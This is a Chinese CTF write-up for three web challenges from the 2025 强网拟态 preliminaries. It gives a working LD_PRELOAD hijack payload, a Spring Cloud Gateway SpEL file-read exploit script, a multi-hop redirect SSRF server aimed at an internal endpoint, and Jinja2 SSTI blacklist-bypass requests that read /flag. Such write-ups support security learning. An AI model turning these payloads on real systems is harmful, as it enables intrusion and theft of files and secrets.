+++
date = '2025-11-18T20:34:00+08:00'
lastmod = '2025-11-18T20:34:00+08:00'
draft = false
title = '2025 强网拟态 初赛 WriteUP'
categories = ['WriteUP']
tags = ['WriteUP', '强网拟态', '2025']

+++

## Web

### smallcode

查看源码。

```PHP
<?php
    highlight_file(__FILE__);
    if(isset($_POST['context'])){
        $context = $_POST['context'];
        file_put_contents("1.txt",base64_decode($context));
    }

    if(isset($_POST['env'])){
        $env = $_POST['env'];
        putenv($env);
    }
    system("nohup wget --content-disposition -N hhhh &");
?>
```

我们发现可以写环境变量，并且`wget`还是每刷新一次就会执行一次，所以我们猜测这里是打LD_preload劫持。

经过测试，发现还要提权。

```C
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload() {
        system("whoami >> /var/www/html/flag.txt");
        system("ls / -al >> /var/www/html/flag.txt");
        system("find / -perm -u=s -type f 2>/dev/null >> /var/www/html/flag.txt");
        system("nl /flag >> /var/www/html/flag.txt");
}   
__attribute__ ((__constructor__)) void preload (void){
    unsetenv("LD_PRELOAD");
    payload();
}
```

然后，给它编译成`.so`文件。

```Bash
gcc -c -fPIC hack.c -o hack && gcc --share hack -o hack.so
```

base64编码之后，保存到`1.txt`当中，然后去设置`ld_preload`。

```C
env=LD_PRELOAD=/var/www/html/1.txt
```

然后访问`/flag.txt`，即可得flag。

### ezcloud

首先，我们发现它是`springcloud`，然后我们去搜索资料，发现了一下内容。

![img](../assets/1762995544179-5.png)

我们尝试进行攻击，结果发现，无法利用，我们再进一步搜索，发现这个东西还有新的漏洞，具体参考文章如下。

https://blog.z3r.ru/posts/spring-cloud-gateway-spel-vuln/ 经过尝试，我们发现payload确实可用，但是目前只能修改系统属性，不能RCE，此时我又注意到另一篇文章。

https://psytester.github.io/CVE-2025-41243_Spring_SpEL_property_modification/

![img](../assets/1762995544173-1.png)

我们发现，可以让他任意读文件，从而直接读到flag，我们修改利用脚本。

```Python
import requests

s = requests.Session()
URL = "http://web-a5943a1bd9.challenge.xctf.org.cn/"

ROUTE_NAME = "test_abc"

def add_route(predicate: str):
    res = s.post(
        f"{URL}actuator/gateway/routes/{ROUTE_NAME}",
        json={
            "predicates": [{"name": "Path", "args": {"_genkey_0": "/actuators/test"}}],
            "filters": [
                {
                    "name": "RewritePath",
                    "args": {
                        "_genkey_0": "/test",
                        "_genkey_1": predicate,
                    },
                }
            ],
            "uri": "http://example.com",
            "order": -1,
        },
    )
    res.raise_for_status()
    a = s.post(
        f"{URL}actuator/gateway/refresh",
    )
    # print(a.text)
    res.raise_for_status()

def read_route():
    res = s.get(f"{URL}actuator/gateway/routes/{ROUTE_NAME}")
    try:
        return res.json()["filters"]
    except Exception as e:
        print(f"UNEXPECTED: {e!r}, {res.status_code} {res.text}")
        raise

def delete_route():
    res = s.delete(f"{URL}actuator/gateway/routes/{ROUTE_NAME}")
    res.raise_for_status()
    s.post(
        f"{URL}actuator/gateway/refresh",
    )
    res.raise_for_status()

add_route("#{ @systemProperties['spring.cloud.gateway.restrictive-property-accessor.enabled'] = false}")

print(read_route())

add_route("#{ @environment.getPropertySources.?[#this.name matches '.*optional:classpath:.*' ][0].source.![{#this.getKey, #this.getValue.toString}] }")

print(read_route())

add_route("#{@resourceHandlerMapping.urlMap['/webjars/**'].locationValues[0]='file:///'}")

print(read_route())

add_route("#{@resourceHandlerMapping.urlMap['/webjars/**'].afterPropertiesSet}")

print(read_route())
```

从而得到flag。

```C
flag{DOt8nWF0PirAuUOt5SwA7B80PVmnqZf6}
```

### safesecret

我们审计源代码。

```Python
from flask import Flask, request, jsonify, Response, abort, render_template_string, session
import requests, re
from urllib.parse import urljoin, urlparse

app = Flask(__name__)

MAX_TOTAL_STEPS = 30
ERROR_COUNT = 6

META_REFRESH_RE = re.compile(
    r'<meta\s+http-equiv=["\']refresh["\']\s+content=["\']\s*\d+\s*;\s*url=([^"\']+)["\']',
    re.IGNORECASE
)

def read(f): return open(f).read()

SECRET = read("/secret").strip()
app.secret_key = "a_test_secret"

def sset(key, value):
    session[key] = value
    return ""

def sget(key, default=None):
    return session.get(key, default)

app.jinja_env.globals.update(sget=sget)
app.jinja_env.globals.update(sset=sset)

@app.route("/_internal/secret")
def internal_flag():
    if request.remote_addr not in ("127.0.0.1", "::1"):
        abort(403)
    body = f'OK Secret: {SECRET}'
    return Response(body, mimetype="application/json")

@app.route("/")
def index():
    return "welcome"

def _next_by_refresh_header(r, current_url):
    refresh = r.headers.get("Refresh")
    if not refresh:
        return None
    try:
        part = refresh.split(";", 1)[1]
        k, v = part.split("=", 1)
        if k.strip().lower() == "url":
            return urljoin(current_url, v.strip())
    except Exception:
        return None

def _next_by_meta_refresh(r, current_url):
    m = META_REFRESH_RE.search(r.text[:5000])
    if m:
        return urljoin(current_url, m.group(1).strip())
    return None

def _next_by_authlike_header(r, current_url):
    if r.status_code in (401, 407, 429):
        nxt = r.headers.get("X-Next")
        if nxt:
            return urljoin(current_url, nxt)
    return None

def my_fetch(url):
    session = requests.Session()
    current_url = url
    count_redirect = 0
    history = []
    last_resp = None

    while count_redirect < MAX_TOTAL_STEPS:
        print(count_redirect)
        try:
            r = session.get(current_url, allow_redirects=False, timeout=5)
            print(r.text)
        except Exception as e:
            return history, None, f"Upstream request failed: {e}"

        last_resp = r
        history.append({
            "url": current_url,
            "status": r.status_code,
            "headers": dict(r.headers),
            "body_preview": r.text[:800]
        })

        nxt = _next_by_refresh_header(r, current_url)
        if nxt:
            current_url = nxt
            count_redirect += 1
            continue

        nxt = _next_by_meta_refresh(r, current_url)
        if nxt:
            current_url = nxt
            count_redirect += 1
            continue

        nxt = _next_by_authlike_header(r, current_url)
        if nxt:
            current_url = nxt
            count_redirect += 1
            continue

        break

    return history, last_resp, None

@app.route("/fetch")
def fetch():
    target = request.args.get("url")
    if not target:
        return jsonify({"error": "no url"}), 400

    history, last_resp, err = my_fetch(target)
    if err:
        return jsonify({"error": err}), 502
    if not last_resp:
        return jsonify({"error": "no response"}), 502

    walked_steps = len(history) - 1
    try:
        if "application/json" in (last_resp.headers.get("Content-Type") or "").lower():
            _ = last_resp.json()
        else:
            if "MUST_HAVE_FIELD" not in last_resp.text:
                raise ValueError("JSON schema mismatch")
        return jsonify({"ok": True, "len": len(last_resp.text)})

    except Exception as parse_err:
        if walked_steps >= ERROR_COUNT:
            raw = []
            raw.append(last_resp.text[:5000])
            return Response("\n".join(raw), mimetype="text/plain", status=500)
        else:
            return jsonify({"error": "Invalid JSON"}), 500

@app.route("/login")
def login():
    username = request.args.get("username")
    secret = request.args.get("secret", "")
    blacklist = ["config", "_", "read", "{{"]
    if secret != SECRET:
        return ("forbidden", 403)

    if len(username) > 47:
        return ("username too long", 400)

    if any([n in username.lower() for n in blacklist]):
        return ("forbidden", 403)

    sset('username', username)

    rendered = render_template_string("Welcome: " + username)
    return rendered

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

发现它想要得到ssrf的回显，必须要大于4次的重定向，我们构造一个利用脚本。

```Python
from flask import Flask, make_response

app = Flask(__name__)

@app.route('/step1')
def step1():
    resp = make_response('redirecting...')
    resp.headers['Refresh'] = '0; url=http://117.72.148.131:1235/step2'
    return resp

@app.route('/step2')
def step2():
    resp = make_response('redirecting...')
    resp.headers['Refresh'] = '0; url=http://117.72.148.131:1235/step3'
    return resp

@app.route('/step3')
def step3():
    resp = make_response('redirecting...')
    resp.headers['Refresh'] = '0; url=http://117.72.148.131:1235/step4'
    return resp

@app.route('/step4')
def step4():
    resp = make_response('redirecting...')
    resp.headers['Refresh'] = '0; url=http://117.72.148.131:1235/step5'
    return resp

@app.route('/step5')
def step5():
    resp = make_response('redirecting...')
    resp.headers['Refresh'] = '0; url=http://117.72.148.131:1235/step6'
    return resp

@app.route('/step6')
def step6():
    resp = make_response('redirecting...')
    resp.headers['Refresh'] = '0; url=http://127.0.0.1:5000/_internal/secret'
    return resp

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1235, debug=False)
```

最后，拿到secret，可以进行下一步攻击，接下来就是晨曦✌的表演时刻了！

```Plain
secret=1140457d-a0b5-4e6d-a423-5a676e61992a
```

SSTI 限定了长度，还限定了不能用 config 

审计源码发现这两个函数注册到 jinja2 里了

![img](../assets/1762995544173-2.png)

因此可以使用  sset.__globals__ 得到 globals

过滤了下划线，用 request.args.a 绕过

```Bash
/login?secret=1140457d-a0b5-4e6d-a423-5a676e61992a&username={%print(sset[request.args.a])%}&a=__globals__
```

![img](../assets/1762995544174-3.png)

接着调用 read 函数，此时发现长度超了，用 session 来做缓存

```Bash
/login?secret=1140457d-a0b5-4e6d-a423-5a676e61992a&username={%print(sset('a',request.args.a))%}&a=__globals__
```

最后调用read函数读 /flag

```Bash
/login?secret=1140457d-a0b5-4e6d-a423-5a676e61992a&username={%print(sset[session.a]['re''ad']('/flag'))%}
```

![img](../assets/1762995544174-4.png)

